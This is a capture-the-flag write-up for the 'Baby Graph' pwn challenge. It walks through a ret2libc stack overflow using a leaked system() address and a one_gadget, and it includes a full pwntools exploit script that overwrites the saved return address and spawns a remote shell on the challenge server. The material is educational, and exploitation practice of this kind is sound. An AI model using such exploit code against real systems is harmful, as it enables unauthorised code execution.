# Baby Graph
## Solved by: oneNutW0nder
## 19 Solves

> This is what happens to your baby when you want a pwner and a graph theorist. Do your part!!!

- This challenge was my first ever attempt at solving a _ret2libc_ challenge! I have been learning more binary exploitation in my free time but have not gotten to this point yet, nonetheless, I was confident that I could figure it out.

- As I mentioned this is a _ret2libc_ challenge. I guessed this based on the fact that we were given a `libc.so` file along with the target binary and the source code. We can also verify that it is this type of challenge by running `checksec` on the binary:

![](Pasted%20image%2020210419133229.png)

- In the shot above we can see that `NX` is enabled which means the stack is not executable. This means we will have to ROP instead of jumping to shellcode on the stack. I will not be explaining what ROP is or the concepts involved in it as there are many better resources out there that can do a much better job of explaining the concepts than I would be able to. 

- Along with the challenge binary and `libc.so`, we were also given the source code! This is awesome because we don't have to spend time reverse engineering the binary to find the bug. If we take a look at the source we can see it does some math shenanigans with Eulerian graphs. This is something that was thrown in to add a little extra piece to solving the challenge. If you look at the code in `main()` you must successfully identify if a given graph is Eulerian or not 5 times before the `vuln()` function is called:

![](Pasted%20image%2020210419133619.png)

![](Pasted%20image%2020210419133638.png)

- After some experimentation I decided that I would just choose the `N` option every time because I am lazy and didn't feel like parsing the output and doing the math in my exploit code :P.

- Anyway, if we look at `vuln()` it is a very simple function:

![](Pasted%20image%2020210419133814.png)

- It create a buffer, prints the address of the `system()` function and reads in 400 bytes into the buffer it created. This is very clearly a massive buffer overflow and the fact that we are given the address of the `system()` function is helpful for ROP because we don't have to find a way to leak an address now!

- The rest of the exploit is relatively straight forward, we need to first do math successfully (or bruteforce it), then send our ROP chain as a payload when `fgets()` is called inside `vuln()`.  We need to do the following still:
	- Identify where we have to overflow to in order to overwrite RIP
	- Find ROP gadgets to get a shell
	
- Finding the overflow point is straight forward aside from the math being annoying. After some experimentation we find the buffer needs to be 120 bytes long before we start overwriting the saved RIP.

- Next we need to build our ROP chain! Again, other sources will explain how this works better than I can and in more detail. We can accomplish what we need by using `one_gadget` which will give us an address for a full ROP chain so we don't have to do much work.

![](Pasted%20image%2020210419134704.png)

- This gives us three addresses to try that will give us a shell. The last thing to do is build the exploit and fire away! Below is the exploit that was used and executed with `python2.7` (Python3 does weird things with bytes and I am still working it out). 

```python
from pwn import *

BUFFER_LEN = 120 # Length of buffer till we hit saved RIP
HOST = "challenges1.ritsec.club"
PORT = 1339
LIBC = "./libc.so.6"

local = False

elf = pwnlib.elf.ELF("./babygraph")

if local:
    p = elf.process()
else:
    p = pwnlib.tubes.remote.remote(HOST, PORT)
    libc = pwnlib.elf.ELF("./libc.so.6")

# print(p.recv())

print(p.recvuntil("(Y/N)\n"))
p.sendline("N")
print(p.recvuntil("(Y/N)\n"))
p.sendline("N")
print(p.recvuntil("(Y/N)\n"))
p.sendline("N")
print(p.recvuntil("(Y/N)\n"))
p.sendline("N")
print(p.recvuntil("(Y/N)\n"))
p.sendline("N")

# Get the address of system()
print(p.recvuntil("prize: "))
systemAddr = p.recvline()
systemAddr = systemAddr.decode().strip()
# Get base address
system = int(systemAddr, 16)
print("Address of system():", hex(system))

# Set base addr for libc
print("Addr of libc system:", hex(libc.symbols['system']))
libc.address = system - libc.symbols['system']
print("Base address of libc:", hex(libc.address))

# ROPgadet --binary libc
# 0x00000000004017c3 : pop rdi ; ret
#0x0000000000026b72 : pop rdi ; ret
pop_rdi = 0x0000000000026b72

# bin_sh = libc.search("/bin/sh").next()
bin_sh = 0x1b75aa
print("Address of /bin/sh:", hex(bin_sh))
bin_sh = bin_sh + libc.address
print("Address of /bin/sh:", hex(bin_sh))
execve = 0xe6c81 + libc.address
#execve = 0xe6c84 + libc.address
print("Addr of one_gadget:", hex(execve))

rop_chain = [
    pop_rdi, bin_sh,
    system
]
# rop_chain = ''.join([pwnlib.util.packing.p64(r) for r in rop_chain])

payload = b"A" * BUFFER_LEN 
payload += pwnlib.util.packing.p64(execve)
#payload += pwnlib.util.packing.p64(pop_rdi)
#payload += pwnlib.util.packing.p64(bin_sh)
#payload += pwnlib.util.packing.p64(execve)
# payload += rop_chain
# print(payload)
p.sendline(payload)
p.interactive()
```

- This includes all my testing and comments as well. Note that I had to try two different _one_gadget_ addresses as the first one that I tried did not work. Enjoy the flag!


![](Pasted%20image%2020210418220013.png)